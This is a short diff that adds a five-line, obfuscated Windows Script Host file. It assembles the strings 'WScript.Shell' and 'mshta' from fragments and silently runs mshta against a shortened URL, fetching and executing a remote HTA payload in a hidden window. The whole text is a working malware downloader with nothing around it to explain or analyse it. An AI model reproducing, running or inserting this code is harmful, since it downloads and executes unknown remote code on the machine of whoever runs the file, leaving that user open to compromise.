@@ -1,0 +1,5 @@
+jfmuyemz = ("cript.Sh")
+var sguxzurj = WScript.CreateObject("WS"+jfmuyemz+"ell")
+syuppqms = ("msh")
+prfrrwed = ("ta ")
+sguxzurj.Run((syuppqms+prfrrwed)+" https://t.ly/Gm8w",0)
